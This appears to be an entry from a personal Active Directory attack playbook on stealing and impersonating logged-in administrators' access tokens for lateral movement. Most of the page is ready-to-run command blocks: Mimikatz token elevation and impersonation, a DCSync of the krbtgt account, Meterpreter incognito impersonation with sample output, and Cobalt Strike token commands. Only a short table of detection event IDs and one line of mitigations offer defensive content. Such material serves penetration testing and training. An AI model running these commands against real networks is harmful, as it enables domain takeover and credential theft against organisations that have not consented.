---
title: "Attack #60 — Token Stealing and Impersonation"
description: "When a privileged user (e.g., Domain Admin) is logged into a compromised machine, their access token persists in memory. An attacker with local…"
category: active-directory
subcategory: "Lateral Movement"
tags: ["active-directory", "credential-access", "delegation", "privilege-escalation", "lateral-movement"]
tools: ["Mimikatz", "Meterpreter", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #60 — Token Stealing and Impersonation.md"
---
# ⚫ Attack #60 — Token Stealing & Impersonation (Lateral)

***

## 📖 How It Works

When a privileged user (e.g., Domain Admin) is logged into a compromised machine, their **access token** persists in memory. An attacker with local admin/SYSTEM can **steal that token** and use it to perform actions as that user — including accessing other machines, without knowing their password. This differs from Attack #45 (SeImpersonatePrivilege) — this is about **stealing existing logged-in user tokens** for lateral movement.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **SYSTEM or local admin on target** | To access other users' tokens |
| **Privileged user logged in** | DA/admin must have an active or cached session |

***

## 💻 Full Commands

```powershell
# ── Mimikatz — token manipulation ─────────────────────────────────────────────
privilege::debug
token::elevate                    # Elevate to SYSTEM token
token::list                       # List all available tokens
token::impersonate /user:CORP\da_admin  # Impersonate a specific user's token

# After impersonation:
dir \\DC01.corp.local\C$           # Access DC as DA
lsadump::dcsync /domain:corp.local /user:krbtgt  # DCSync as DA
```

```bash
# ── Meterpreter — Incognito ───────────────────────────────────────────────────
meterpreter> load incognito
meterpreter> list_tokens -u
# Delegation Tokens Available:
# CORP\da_admin
meterpreter> impersonate_token "CORP\da_admin"
meterpreter> shell
whoami
# corp\da_admin
```

```powershell
# ── Cobalt Strike (beacon) ────────────────────────────────────────────────────
# steal_token <PID>           # Steal token from a specific process
# make_token CORP\user pass   # Create token with credentials
# rev2self                    # Revert to original token
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Logon Type 9 (NewCredentials) — token impersonation |
| **Sysmon 10** | Sysmon | Process access — tool accessing LSASS for token enumeration |

***

## 🔗 Attack Chain Context

```
[Token Stealing] ──→ Steal logged-in admin's token → lateral movement as them
         │
         ├──→ 🔑 No password needed — just steal the token from memory
         ├──→ 🔗 Commonly used after: initial compromise → SYSTEM → token theft
         └──→ 💀 Defeated by: limit DA logon to workstations, use PAW, Credential Guard
```

***

> ✅ **Attack #60 — Token Stealing complete.**

***

> 🏁 **Category 7 — Lateral Movement is now COMPLETE (7/7 attacks).**
